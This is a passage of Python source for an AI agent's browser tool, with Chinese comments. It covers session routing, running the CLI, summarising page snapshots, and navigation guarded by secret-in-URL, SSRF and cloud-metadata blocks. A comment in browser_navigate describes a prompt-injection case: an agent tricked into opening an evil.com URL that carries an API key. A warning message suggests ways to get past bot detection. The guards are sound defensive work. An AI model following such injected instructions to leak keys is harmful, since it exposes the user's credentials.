        "session_name": session_name,
        "bb_session_id": None,
        "cdp_url": None,
        "features": {"local": True},
    }


def _create_cdp_session(task_id: str, cdp_url: str) -> Dict[str, str]:
    """创建一个连接到用户提供的 CDP 端点的会话。"""
    import uuid
    session_name = f"cdp_{uuid.uuid4().hex[:10]}"
    logger.info("Created CDP browser session %s → %s for task %s",
                session_name, cdp_url, task_id)
    return {
        "session_name": session_name,
        "bb_session_id": None,
        "cdp_url": cdp_url,
        "features": {"cdp_override": True},
    }


def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
    """
    获取或创建给定会话 key 对应的会话信息。

    云端模式下会创建一个启用代理的 Browserbase 会话。
    本地模式下会为 agent-browser --session 生成一个会话名。
    同时会启动不活跃清理线程并更新活动跟踪。
    线程安全：多个子 agent 可并发调用。

    参数：
        task_id: 会话 key。通常就是 task_id 本身，但混合路由的本地 sidecar
            会带有 ``::local`` 后缀 —— 此时会跳过云端 provider（即使配置了），
            改为创建一个本地 Chromium 会话。

    返回：
        包含 session_name（必有）、bb_session_id + cdp_url（仅云端）的字典
    """
    if task_id is None:
        task_id = "default"

    # 若清理线程未运行则启动它（处理不活跃超时）
    _start_browser_cleanup_thread()

    # 更新本会话的活动时间戳
    _update_session_activity(task_id)

    with _cleanup_lock:
        # 检查是否已有该 task 的会话
        if task_id in _active_sessions:
            return _active_sessions[task_id]

    # 混合路由：以 ``::local`` 结尾的会话 key 会强制使用本地 Chromium，
    # 无论全局配置了什么云端 provider。同一会话中的公有 URL 仍使用
    # 裸 task_id key 下的云端会话。
    force_local = _is_local_sidecar_key(task_id)

    # 在锁外创建会话（云端模式下涉及网络调用）
    cdp_override = _get_cdp_override()
    if cdp_override and not force_local:
        session_info = _create_cdp_session(task_id, cdp_override)
    elif force_local:
        session_info = _create_local_session(task_id)
    else:
        provider = _get_cloud_provider()
        if provider is None:
            session_info = _create_local_session(task_id)
        else:
            try:
                session_info = provider.create_session(task_id)
                # 校验云端 provider 返回的是否是可用的会话
                if not session_info or not isinstance(session_info, dict):
                    raise ValueError(f"Cloud provider returned invalid session: {session_info!r}")
                if session_info.get("cdp_url"):
                    # 某些云端 provider（包括 Browser-Use v3）会返回 HTTP 形式的
                    # CDP 发现 URL，而不是原始的 websocket 端点。
                    session_info = dict(session_info)
                    session_info["cdp_url"] = _resolve_cdp_override(str(session_info["cdp_url"]))
            except Exception as e:
                provider_name = type(provider).__name__
                logger.warning(
                    "Cloud provider %s failed (%s); attempting fallback to local "
                    "Chromium for task %s",
                    provider_name, e, task_id,
                    exc_info=True,
                )
                try:
                    session_info = _create_local_session(task_id)
                except Exception as local_error:
                    raise RuntimeError(
                        f"Cloud provider {provider_name} failed ({e}) and local "
                        f"fallback also failed ({local_error})"
                    ) from e
                # 将会话标记为降级，便于可观测性
                if isinstance(session_info, dict):
                    session_info = dict(session_info)
                    session_info["fallback_from_cloud"] = True
                    session_info["fallback_reason"] = str(e)
                    session_info["fallback_provider"] = provider_name

    with _cleanup_lock:
        # 二次检查：在我们做网络调用期间，另一个线程可能已经创建了会话。
        # 使用已有的那个，避免泄漏孤儿云端会话。
        if task_id in _active_sessions:
            return _active_sessions[task_id]
        _active_sessions[task_id] = session_info

    # 会话已存在后懒启动 CDP supervisor（前提是后端通过 override 或
    # session_info["cdp_url"] 暴露了一个 CDP URL）。
    # 幂等操作；会吞掉异常。详见 _ensure_cdp_supervisor。
    # 本地 sidecar 跳过 —— 它们没有 CDP URL。
    if not force_local:
        _ensure_cdp_supervisor(task_id)

    return session_info



def _find_agent_browser() -> str:
    """
    查找 agent-browser CLI 可执行文件。

    依次检查：当前 PATH、Homebrew/常见 bin 目录、Hermes 托管的 node、
    本地 node_modules/.bin/、npx 兜底。

    返回：
        agent-browser 可执行文件的路径

    抛出：
        FileNotFoundError: 若未安装 agent-browser
    """
    global _cached_agent_browser, _agent_browser_resolved
    if _agent_browser_resolved:
        if _cached_agent_browser is None:
            raise FileNotFoundError(
                "agent-browser CLI not found (cached). Install it with: "
                f"{_browser_install_hint()}\n"
                "Or run 'npm install' in the repo root to install locally.\n"
                "Or ensure npx is available in your PATH."
            )
        return _cached_agent_browser

    # 注意：_agent_browser_resolved 是在下面每个返回点设置的
    # （而不是搜索之前），以防止并发线程看到 resolved=True、
    # 但 _cached_agent_browser 仍为 None 的竞态。
    #
    # 下面每个候选项在缓存之前都会用 ``agent_browser_runnable`` 校验。
    # 单纯的 ``shutil.which`` 命中并不被信任：agent-browser 的 npm postinstall
    # 会把全局安装的符号链接重指向我们本地的 node_modules 二进制，而在下一次
    # ``hermes update`` 后该二进制会消失，留下一个 ``which`` 仍能找到、但执行
    # 时以 exit 127 失败的悬空链接（issue #48521）。校验能让失效的候选项
    # 回落到下一个可用的解析路径（扩展 PATH → 本地 .bin → npx），而不是缓存
    # 那个坏掉的、从而悄悄废掉所有浏览器工具。

    # 检查是否在 PATH 中（全局安装）
    which_result = shutil.which("agent-browser")
    if which_result and agent_browser_runnable(which_result):
        _cached_agent_browser = which_result
        _agent_browser_resolved = True
        return which_result

    # 构建扩展的搜索 PATH，包含 Hermes 托管的 Node、macOS 上带版本的
    # Homebrew 安装，以及 Termux 等兜底系统目录。
    extended_path = _merge_browser_path("")
    if extended_path:
        which_result = shutil.which("agent-browser", path=extended_path)
        if which_result and agent_browser_runnable(which_result):
            _cached_agent_browser = which_result
            _agent_browser_resolved = True
            return which_result

    # 检查本地 node_modules/.bin/（在仓库根目录执行 npm install 后生成）。
    # 在 Windows 上，npm 会在 .bin 中放下三个垫片：一个无扩展名的 POSIX shell
    # 脚本（供 Git Bash / WSL 使用）、`agent-browser.cmd`（供 cmd/PowerShell
    # 使用）、以及 `agent-browser.ps1`（供 PowerShell 使用）。CreateProcess
    # （Windows 上 Python subprocess 所使用）无法执行无扩展名的垫片 —— 它会
    # 抛出 WinError 193 "%1 is not a valid Win32 application"。我们必须解析到
    # `.cmd` 垫片。`shutil.which` 会参考 PATHEXT，因此我们显式传入 path
    # 委托给它，以便 POSIX 主机仍能选中无扩展名的垫片。
    repo_root = Path(__file__).parent.parent
    local_bin_dir = repo_root / "node_modules" / ".bin"
    if local_bin_dir.is_dir():
        local_which = shutil.which("agent-browser", path=str(local_bin_dir))
        if local_which and agent_browser_runnable(local_which):
            _cached_agent_browser = local_which
            _agent_browser_resolved = True
            return _cached_agent_browser

    # 检查常见的 npx 路径（同时搜索扩展的兜底 PATH）
    npx_path = shutil.which("npx")
    if not npx_path and extended_path:
        npx_path = shutil.which("npx", path=extended_path)
    if npx_path:
        _cached_agent_browser = "npx agent-browser"
        _agent_browser_resolved = True
        return _cached_agent_browser

    # 都没找到 —— 在放弃之前尝试懒安装。
    try:
        from hermes_cli.dep_ensure import ensure_dependency
        if ensure_dependency("browser"):
            candidates = [
                shutil.which("agent-browser"),
                shutil.which("agent-browser", path=extended_path) if extended_path else None,
                shutil.which("agent-browser", path=str(get_hermes_home() / "node_modules" / ".bin")),
                shutil.which("agent-browser", path=str(get_hermes_home() / "node" / "bin")),
                shutil.which("agent-browser", path=str(get_hermes_home() / "node")),
            ]
            for recheck in candidates:
                if recheck and agent_browser_runnable(recheck):
                    _cached_agent_browser = recheck
                    _agent_browser_resolved = True
                    return recheck
    except Exception:
        pass

    _agent_browser_resolved = True
    raise FileNotFoundError(
        "agent-browser CLI not found. Install it with: "
        f"{_browser_install_hint()}\n"
        "Or run 'npm install' in the repo root to install locally.\n"
        "Or ensure npx is available in your PATH."
    )


def _extract_screenshot_path_from_text(text: str) -> Optional[str]:
    """从 agent-browser 的人类可读输出中抽取截图文件路径。"""
    if not text:
        return None

    patterns = [
        r"Screenshot saved to ['\"](?P<path>/[^'\"]+?\.png)['\"]",
        r"Screenshot saved to (?P<path>/\S+?\.png)(?:\s|$)",
        r"(?P<path>/\S+?\.png)(?:\s|$)",
    ]

    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            path = match.group("path").strip().strip("'\"")
            if path:
                return path

    return None


def _run_browser_command(
    task_id: str,
    command: str,
    args: List[str] = None,
    timeout: Optional[int] = None,
    _engine_override: Optional[str] = None,
) -> Dict[str, Any]:
    """
    使用我们预先创建好的 Browserbase 会话运行一条 agent-browser CLI 命令。

    参数：
        task_id: 任务标识符，用于获取对应的会话
        command: 要运行的命令（例如 "open"、"click"）
        args: 命令的附加参数
        timeout: 命令超时时间（秒）。``None`` 表示从 config 读取
                 ``browser.command_timeout``（默认 30 秒）。
        _engine_override: 仅本次调用强制使用指定引擎。供 Lightpanda 回退逻辑
                          内部使用，以便用 Chrome 重试而不动全局状态。

    返回：
        agent-browser 返回的、已解析的 JSON 响应
    """
    if timeout is None:
        timeout = _get_command_timeout()
    args = args or []

    # 构建命令
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError as e:
        logger.warning("agent-browser CLI not found: %s", e)
        return {"success": False, "error": str(e)}

    if _requires_real_termux_browser_install(browser_cmd):
        error = _termux_browser_install_error()
        logger.warning("browser command blocked on Termux: %s", error)
        return {"success": False, "error": error}

    # 本地模式且磁盘上没有 Chromium：直接以可操作的错误信息失败，
    # 而不是每次调用都挂起等待 _command_timeout 秒。
    # engine=lightpanda 时跳过 —— Lightpanda 做导航不需要 Chromium。
    if _is_local_mode() and not _chromium_installed() and _get_browser_engine() != "lightpanda":
        if _running_in_docker():
            hint = (
                "Chromium browser is missing. You're running in Docker — pull "
                "the latest image to get the bundled Chromium: "
                "docker pull ghcr.io/nousresearch/hermes-agent:latest"
            )
        else:
            hint = (
                "Chromium browser is missing. Install it with: "
                "npx agent-browser install --with-deps "
                "(or: npx playwright install --with-deps chromium)"
            )
        logger.warning("browser command blocked: %s", hint)
        return {"success": False, "error": hint}

    from tools.interrupt import is_interrupted
    if is_interrupted():
        return {"success": False, "error": "Interrupted"}

    # 获取会话信息（如需要会创建启用代理的 Browserbase 会话）
    try:
        session_info = _get_session_info(task_id)
    except Exception as e:
        logger.warning("Failed to create browser session for task=%s: %s", task_id, e)
        return {"success": False, "error": f"Failed to create browser session: {str(e)}"}

    # 用合适的后端 flag 构建命令。
    # 云端模式：--cdp <websocket_url> 连接到 Browserbase。
    # 本地模式：--session <name> 启动一个本地 headless Chromium。
    # 命令的其余部分（--json、command、args）完全相同。
    if session_info.get("cdp_url"):
        # 云端模式 —— 通过 CDP 连接到远端 Browserbase 浏览器
        # 重要：不要把 --session 和 --cdp 一起用。在 agent-browser >=0.13 中，
        # --session 会创建一个本地浏览器实例，并静默忽略 --cdp。
        backend_args = ["--cdp", session_info["cdp_url"]]
    else:
        # 本地模式 —— 启动一个 headless Chromium 实例
        backend_args = ["--session", session_info["session_name"]]

    # Lightpanda 引擎注入（仅本地模式，agent-browser v0.25.3+）。
    # 使用解析出的会话后端，而不是全局的云端 provider 状态：
    # 混合私有 URL 路由可能在一个云端 provider 仍服务于公有 URL 时，
    # 创建一个本地 sidecar。
    engine = _engine_override or _get_browser_engine()
    if engine != "auto" and not _is_camofox_mode() and not session_info.get("cdp_url"):
        backend_args += ["--engine", engine]

    # 保留具体的可执行文件路径原样，即便其中包含空格。
    # 只有合成的 npx 兜底项需要展开为多个 argv 项。
    # shutil.which 在 Windows 上把 npx 解析为 npx.cmd；POSIX 上保持为裸 "npx"。
    if browser_cmd == "npx agent-browser":
        _npx_bin = shutil.which("npx") or "npx"
        cmd_prefix = [_npx_bin, "agent-browser"]
    else:
        cmd_prefix = [browser_cmd]

    cmd_parts = cmd_prefix + backend_args + [
        "--json",
        command
    ] + args

    try:
        # 为每个 task 分配独立的 socket 目录，避免并发冲突。
        # 否则并行 worker 会争抢同一个默认 socket 路径，
        # 导致 "Failed to create socket directory: Permission denied" 错误。
        task_socket_dir = os.path.join(
            _socket_safe_tmpdir(),
            f"agent-browser-{session_info['session_name']}"
        )
        os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
        # 把当前 hermes PID 记录为会话拥有者（跨进程安全的孤儿检测
        # —— 参见 _write_owner_pid）。
        _write_owner_pid(task_socket_dir, session_info['session_name'])
        logger.debug("browser cmd=%s task=%s socket_dir=%s (%d chars)",
                     command, task_id, task_socket_dir, len(task_socket_dir))

        browser_env = {**os.environ}

        # 确保子进程继承 CLI 发现阶段使用的、浏览器专用的 PATH 兜底项。
        browser_env["PATH"] = _merge_browser_path(browser_env.get("PATH", ""))
        browser_env["AGENT_BROWSER_SOCKET_DIR"] = task_socket_dir

        # 告诉 agent-browser 守护进程：在超过我们配置的不活跃超时后自行退出。
        # 这是守护进程侧对应于我们 Python 侧 _cleanup_inactive_browser_sessions
        # 的机制 —— 当窗口时间内没有任何 CLI 命令到达时，守护进程会杀掉自己
        # 以及它派生的 Chrome 子进程。agent-browser 0.24 起支持。
        if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in browser_env:
            idle_ms = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)
            browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = idle_ms

        # 在需要时注入 --no-sandbox（issue #15765）：
        # - 以 root 运行：Chromium 始终拒绝在没有它的情况下启动
        # - Ubuntu 23.10+ / AppArmor 系统：非特权的 user namespace 受限，
        #   导致 Chromium 即使在 systemd 或容器下以非 root 用户运行，
        #   也会以 "No usable sandbox" 退出。
        # 同时尊重旧的 AGENT_BROWSER_CHROME_FLAGS（agent-browser 自身从不读取它，
        # 但旧文档里有）和真正的 AGENT_BROWSER_ARGS —— 如果用户预设了其中任意
        # 一个，就不要覆盖。
        if (
            "AGENT_BROWSER_ARGS" not in browser_env
            and "AGENT_BROWSER_CHROME_FLAGS" not in browser_env
        ):
            _needs_sandbox_bypass = False
            if hasattr(os, "geteuid") and os.geteuid() == 0:
                _needs_sandbox_bypass = True
                logger.debug("browser: running as root — injecting --no-sandbox")
            else:
                # 检测 AppArmor 对 user namespace 的限制（Ubuntu 23.10+）
                _userns_restrict = "/proc/sys/kernel/apparmor_restrict_unprivileged_userns"
                try:
                    with open(_userns_restrict, encoding="utf-8") as _f:
                        if _f.read().strip() == "1":
                            _needs_sandbox_bypass = True
                            logger.debug(
                                "browser: AppArmor userns restrictions detected — "
                                "injecting --no-sandbox"
                            )
                except OSError:
                    pass
            if _needs_sandbox_bypass:
                browser_env["AGENT_BROWSER_ARGS"] = (
                    "--no-sandbox,--disable-dev-shm-usage"
                )

        # 用临时文件而非管道来接收 stdout/stderr。
        # agent-browser 会启动一个继承文件描述符的后台守护进程。
        # 若用 capture_output=True（管道），守护进程在 CLI 退出后仍持有
        # 管道 fd，导致 communicate() 永远等不到 EOF、一直阻塞到超时。
        stdout_path = os.path.join(task_socket_dir, f"_stdout_{command}")
        stderr_path = os.path.join(task_socket_dir, f"_stderr_{command}")
        stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            # 参见上方另一处 Popen 的同名注释 —— 在 Windows 上，我们把
            # agent-browser 放到独立进程组中，强制使用
            # STARTF_USESTDHANDLES，让 CreateProcess 只把我们的三个显式句柄
            # 交给子进程（不泄漏父控制台句柄、避免干扰 Rust 二进制的守护进程
            # 派生），并设置 close_fds=True 以阻断其余句柄的继承。
            _popen_extra: dict = {}
            if os.name == "nt":
                # 参见另一处 Popen 的同名代码块 —— 只用 CREATE_NO_WINDOW，
                # 不加 CREATE_NEW_PROCESS_GROUP（在 Python 3.11 Windows 上会
                # 取消 asyncio 的 loop 任务 → CLI MainThread 中抛出
                # KeyboardInterrupt）。
                _CREATE_NO_WINDOW = 0x08000000
                _popen_extra["creationflags"] = _CREATE_NO_WINDOW
                _popen_extra["close_fds"] = True
                _si = subprocess.STARTUPINFO()
                _si.dwFlags |= subprocess.STARTF_USESTDHANDLES
                _popen_extra["startupinfo"] = _si
            proc = subprocess.Popen(
                cmd_parts,
                stdout=stdout_fd,
                stderr=stderr_fd,
                stdin=subprocess.DEVNULL,
                env=browser_env,
                **_popen_extra,
            )
        finally:
            os.close(stdout_fd)
            os.close(stderr_fd)

        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            logger.warning("browser '%s' timed out after %ds (task=%s, socket_dir=%s)",
                           command, timeout, task_id, task_socket_dir)
            result = {"success": False, "error": f"Command timed out after {timeout} seconds"}
            # 继续往下走，进入下方的回退检查
        else:
            with open(stdout_path, "r", encoding="utf-8") as f:
                stdout = f.read()
            with open(stderr_path, "r", encoding="utf-8") as f:
                stderr = f.read()
            returncode = proc.returncode

            # 清理临时文件（尽力而为）
            for p in (stdout_path, stderr_path):
                try:
                    os.unlink(p)
                except OSError:
                    pass

            # 把 stderr 记录下来用于诊断 —— 失败时用 WARNING 级别，便于可见
            if stderr and stderr.strip():
                level = logging.WARNING if returncode != 0 else logging.DEBUG
                logger.log(level, "browser '%s' stderr: %s", command, stderr.strip()[:500])

            stdout_text = stdout.strip()

            # rc=0 却输出为空是一种异常状态 —— 视为失败，而不是悄悄返回
            # {"success": True, "data": {}}。
            # 某些命令（close、record）正常情况下确实没有输出。
            if not stdout_text and returncode == 0 and command not in _EMPTY_OK_COMMANDS:
                logger.warning("browser '%s' returned empty output (rc=0)", command)
                result = {"success": False, "error": f"Browser command '{command}' returned no output"}
            elif stdout_text:
                try:
                    parsed = json.loads(stdout_text)
                    # 若快照返回为空则告警（通常是守护进程/CDP 出问题的征兆）
                    if command == "snapshot" and parsed.get("success"):
                        snap_data = parsed.get("data", {})
                        if not snap_data.get("snapshot") and not snap_data.get("refs"):
                            logger.warning("snapshot returned empty content. "
                                           "Possible stale daemon or CDP connection issue. "
                                           "returncode=%s", returncode)
                    result = parsed
                except json.JSONDecodeError:
                    raw = stdout_text[:2000]
                    logger.warning("browser '%s' returned non-JSON output (rc=%s): %s",
                                   command, returncode, raw[:500])

                    if command == "screenshot":
                        stderr_text = (stderr or "").strip()
                        combined_text = "\n".join(
                            part for part in [stdout_text, stderr_text] if part
                        )
                        recovered_path = _extract_screenshot_path_from_text(combined_text)

                        if recovered_path and Path(recovered_path).exists():
                            logger.info(
                                "browser 'screenshot' recovered file from non-JSON output: %s",
                                recovered_path,
                            )
                            result = {
                                "success": True,
                                "data": {
                                    "path": recovered_path,
                                    "raw": raw,
                                },
                            }
                        else:
                            result = {
                                "success": False,
                                "error": f"Non-JSON output from agent-browser for '{command}': {raw}"
                            }
                    else:
                        result = {
                            "success": False,
                            "error": f"Non-JSON output from agent-browser for '{command}': {raw}"
                        }
            elif returncode != 0:
                # 检查错误
                error_msg = stderr.strip() if stderr else f"Command failed with code {returncode}"
                logger.warning("browser '%s' failed (rc=%s): %s", command, returncode, error_msg[:300])
                result = {"success": False, "error": error_msg}
            else:
                result = {"success": True, "data": {}}

    except Exception as e:
        logger.warning("browser '%s' exception: %s", command, e, exc_info=True)
        result = {"success": False, "error": str(e)}

    # --- Lightpanda 自动 Chrome 回退 ---
    # 若引擎是 lightpanda 且结果看起来异常，则用 Chrome 重试。
    # 这一段对所有退出路径都会执行（超时、空输出、非 JSON、非零 rc、已解析的）。
    fallback_reason = _lightpanda_fallback_reason(engine, command, result)
    if fallback_reason:
        logger.info(
            "Lightpanda fallback: retrying '%s' with Chrome (task=%s): %s",
            command,
            task_id,
            fallback_reason,
        )
        # 对于截图，使用专用的 Chrome 回退辅助函数
        # （会另起一个独立的 Chrome 会话导航到同一 URL）。
        if command == "screenshot":
            fallback_result = _chrome_fallback_screenshot(task_id, args or [], timeout)
        else:
            fallback_result = _run_chrome_fallback_command(task_id, command, args, timeout)
        return _annotate_lightpanda_fallback(fallback_result, fallback_reason)

    return result


def _extract_relevant_content(
    snapshot_text: str,
    user_task: Optional[str] = None
) -> str:
    """用 LLM 根据用户任务从快照中抽取相关内容。

    未配置辅助文本模型时，回落为简单的截断。
    """
    if user_task:
        extraction_prompt = (
            f"You are a content extractor for a browser automation agent.\n\n"
            f"The user's task is: {user_task}\n\n"
            f"Given the following page snapshot (accessibility tree representation), "
            f"extract and summarize the most relevant information for completing this task. Focus on:\n"
            f"1. Interactive elements (buttons, links, inputs) that might be needed\n"
            f"2. Text content relevant to the task (prices, descriptions, headings, important info)\n"
            f"3. Navigation structure if relevant\n\n"
            f"Keep ref IDs (like [ref=e5]) for interactive elements so the agent can use them.\n\n"
            f"Page Snapshot:\n{snapshot_text}\n\n"
            f"Provide a concise summary that preserves actionable information and relevant content."
        )
    else:
        extraction_prompt = (
            f"Summarize this page snapshot, preserving:\n"
            f"1. All interactive elements with their ref IDs (like [ref=e5])\n"
            f"2. Key text content and headings\n"
            f"3. Important information visible on the page\n\n"
            f"Page Snapshot:\n{snapshot_text}\n\n"
            f"Provide a concise summary focused on interactive elements and key content."
        )

    # 在发送给辅助 LLM 之前，先对快照做敏感信息脱敏。
    # 否则一个显示了环境变量或 API key 的页面，会在 run_agent.py 的通用
    # 脱敏层看到工具结果之前，就把密钥泄漏给抽取模型。
    from agent.redact import redact_sensitive_text
    extraction_prompt = redact_sensitive_text(extraction_prompt)

    try:
        call_kwargs = {
            "task": "web_extract",
            "messages": [{"role": "user", "content": extraction_prompt}],
            "max_tokens": 4000,
            "temperature": 0.1,
        }
        model = _get_extraction_model()
        if model:
            call_kwargs["model"] = model
        response = call_llm(**call_kwargs)
        extracted = (response.choices[0].message.content or "").strip() or _truncate_snapshot(snapshot_text)
        # 对辅助 LLM 可能回显出来的密钥做脱敏。
        return redact_sensitive_text(extracted)
    except Exception:
        return _truncate_snapshot(snapshot_text)


def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
    """对快照做结构感知的截断。

    在行边界处裁切，确保无障碍树元素不会被从一行中间切断，
    并追加一段说明，告诉 agent 省略了多少内容。

    参数：
        snapshot_text: 要截断的快照文本
        max_chars: 保留的最大字符数

    返回：
        截断后的文本；如果发生了截断则带有提示
    """
    if len(snapshot_text) <= max_chars:
        return snapshot_text

    lines = snapshot_text.split('\n')
    result: list[str] = []
    chars = 0
    for line in lines:
        if chars + len(line) + 1 > max_chars - 80:  # 为提示预留空间
            break
        result.append(line)
        chars += len(line) + 1
    remaining = len(lines) - len(result)
    if remaining > 0:
        result.append(f'\n[... {remaining} more lines truncated, use browser_snapshot for full content]')
    return '\n'.join(result)


# ============================================================================
# 浏览器工具函数
# ============================================================================

def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
    """
    在浏览器中导航到某个 URL。

    参数：
        url: 要导航到的 URL
        task_id: 用于会话隔离的任务标识符

    返回：
        包含导航结果的 JSON 字符串（首次导航时还包含隐身特性信息）
    """
    # 防泄密保护 —— 拦截那些在查询参数中嵌入 API key 或 token 的 URL。
    # 一次 prompt 注入可能诱骗 agent 导航到
    # https://evil.com/steal?key=sk-ant-... 来外泄密钥。
    # 同时检查 URL 解码后的形式，以捕获 %2D 这类编码手法（例如 sk%2Dant%2D...）。
    import urllib.parse
    from agent.redact import _PREFIX_RE
    url_decoded = urllib.parse.unquote(url)
    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL contains what appears to be an API key or token. "
                     "Secrets must not be sent in URLs.",
        })
    url = _normalize_url_for_request(url)
    normalized_decoded = urllib.parse.unquote(url)
    if _PREFIX_RE.search(url) or _PREFIX_RE.search(normalized_decoded):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL contains what appears to be an API key or token. "
                     "Secrets must not be sent in URLs.",
        })

    # SSRF 防护 —— 在导航前拦截私有/内部地址。
    # 本地后端（Camofox、未配置云端 provider 的 headless Chromium）会跳过，
    # 因为 agent 已通过终端工具获得了完整的本地网络访问权。当混合路由会为
    # 本 URL 自动拉起本地 Chromium 边车时（配置了云端 provider + 私有 URL +
    # 启用了 ``browser.auto_local_for_private_urls``）也跳过 —— 此种情况下
    # 云端 provider 根本不会看到该 URL。也可以通过 config 里的
    # ``browser.allow_private_urls`` 全局关闭。
    effective_task_id = task_id or "default"
    nav_session_key = _navigation_session_key(effective_task_id, url)
    auto_local_this_nav = _is_local_sidecar_key(nav_session_key)

    # 始终拦截的底线：云元数据 / IMDS 端点一律拒绝，无论后端、混合路由
    # 还是 allow_private_urls 如何设置。
    # agent 没有任何正当理由通过浏览器访问
    # 169.254.169.254 / metadata.google.internal / ECS task metadata，
    # 把这些请求路由到 EC2/GCP/Azure 宿主机上的本地 Chromium 边车，
    # 等同于外泄 IAM 凭据（#16234）。
    if not _is_local_backend() and _is_always_blocked_url(url):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL targets a cloud metadata endpoint",
        })

    if (
        not _is_local_backend()
        and not auto_local_this_nav
        and not _allow_private_urls()
        and not _is_safe_url(url)
    ):
        return json.dumps({
            "success": False,
            "error": "Blocked: URL targets a private or internal address",
        })

    # 网站策略检查 —— 导航前拦截
    blocked = check_website_access(url)
    if blocked:
        return json.dumps({
            "success": False,
            "error": blocked["message"],
            "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]},
        })

    # Camofox 后端 —— 通过安全检查后委托处理
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_navigate
        return camofox_navigate(url, task_id)

    if auto_local_this_nav:
        logger.info(
            "browser_navigate: auto-routing %s to local Chromium sidecar "
            "(cloud provider %s stays on cloud for public URLs; "
            "set browser.auto_local_for_private_urls: false to disable)",
            url,
            type(_get_cloud_provider()).__name__ if _get_cloud_provider() else "none",
        )

    # 获取会话信息，检查这是否是一个新会话
    # （若不存在则会创建一个，并记录其特性）
    session_info = _get_session_info(nav_session_key)
    is_first_nav = session_info.get("_first_nav", True)

    # 若配置了录制且这是首次导航，则自动开始录制
    if is_first_nav:
        session_info["_first_nav"] = False
        _maybe_start_recording(nav_session_key)

    result = _run_browser_command(nav_session_key, "open", [url], timeout=max(_get_command_timeout(), 60))

    # 记住是哪个会话服务了本次导航，以便同一 task_id 上的
    # snapshot/click/fill/... 命中它（当混合路由同时存在云端会话和本地
    # 边车时，这一点至关重要）。
    _last_active_session_key[effective_task_id] = nav_session_key

    if result.get("success"):
        data = result.get("data", {})
        title = data.get("title", "")
        final_url = data.get("url", url)

        # 重定向后的 SSRF 检查 —— 如果浏览器跟随重定向跳到了私有/内部地址，
        # 则拦截该结果，防止模型通过后续的 browser_snapshot 读取内部内容。
        # 本地后端会跳过（理由与导航前检查相同），混合本地边车也跳过
        # （因为我们本来就处于一个按设计访问私有 URL 的本地浏览器上）。
        # 始终拦截的底线（云元数据 / IMDS）即便在 auto_local_this_nav 为真时
        # 也照样执行 —— 理由参见导航前检查（#16234）。
        if (
            not _is_local_backend()
            and final_url
            and final_url != url
            and _is_always_blocked_url(final_url)
        ):
            _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
            return json.dumps({
                "success": False,
                "error": "Blocked: redirect landed on a cloud metadata endpoint",
            })

        if (
            not _is_local_backend()
            and not auto_local_this_nav
            and not _allow_private_urls()
            and final_url and final_url != url and not _is_safe_url(final_url)
        ):
            # 跳转到一个空白页，防止快照泄漏
            _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
            return json.dumps({
                "success": False,
                "error": "Blocked: redirect landed on a private/internal address",
            })

        response = {
            "success": True,
            "url": final_url,
            "title": title
        }
        _copy_fallback_warning(response, result)

        # 从 title/url 检测常见的「被拦截」页面特征
        blocked_patterns = [
            "access denied", "access to this page has been denied",
            "blocked", "bot detected", "verification required",
            "please verify", "are you a robot", "captcha",
            "cloudflare", "ddos protection", "checking your browser",
            "just a moment", "attention required"
        ]
        title_lower = title.lower()

        if any(pattern in title_lower for pattern in blocked_patterns):
            response["bot_detection_warning"] = (
                f"Page title '{title}' suggests bot detection. The site may have blocked this request. "
                "Options: 1) Try adding delays between actions, 2) Access different pages first, "
                "3) Enable advanced stealth (BROWSERBASE_ADVANCED_STEALTH=true, requires Scale plan), "
                "4) Some sites have very aggressive bot detection that may be unavoidable."
            )

        # 首次导航时附上特性信息，让模型知道当前启用了哪些能力
        if is_first_nav and "features" in session_info:
            features = session_info["features"]
            active_features = [k for k, v in features.items() if v]
            if not features.get("proxies"):
                response["stealth_warning"] = (
                    "Running WITHOUT residential proxies. Bot detection may be more aggressive. "
                    "Consider upgrading Browserbase plan for proxy support."
                )
            response["stealth_features"] = active_features

        # 自动拍一份精简快照，让模型可以立即行动，无需单独再调用 browser_snapshot。
        try:
            snap_result = _run_browser_command(nav_session_key, "snapshot", ["-c"])
            if snap_result.get("success"):
                snap_data = snap_result.get("data", {})
                snapshot_text = snap_data.get("snapshot", "")
                refs = snap_data.get("refs", {})
                if len(snapshot_text) > SNAPSHOT_SUMMARIZE_THRESHOLD:
                    snapshot_text = _truncate_snapshot(snapshot_text)
                response["snapshot"] = snapshot_text
                response["element_count"] = len(refs) if refs else 0
                if snap_result.get("fallback_warning") and not response.get("fallback_warning"):
                    _copy_fallback_warning(response, snap_result)
        except Exception as e:
            logger.debug("Auto-snapshot after navigate failed: %s", e)

        return json.dumps(response, ensure_ascii=False)
    else:
        return json.dumps({
            "success": False,
            "error": result.get("error", "Navigation failed")
        }, ensure_ascii=False)


def browser_snapshot(
    full: bool = False,
    task_id: Optional[str] = None,
    user_task: Optional[str] = None
) -> str:
    """
    获取当前页面的、基于文本的无障碍树快照。

    参数：
        full: 为 True 时返回完整快照；为 False 时返回精简视图。
        task_id: 用于会话隔离的任务标识符
        user_task: 用户当前的任务（用于任务感知的内容抽取）

    返回：
        包含页面快照的 JSON 字符串
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_snapshot
        return camofox_snapshot(full, task_id, user_task)

    effective_task_id = _last_session_key(task_id or "default")

    # 根据 full 标志构建命令参数
    args = []
    if not full:
        args.extend(["-c"])  # 精简模式

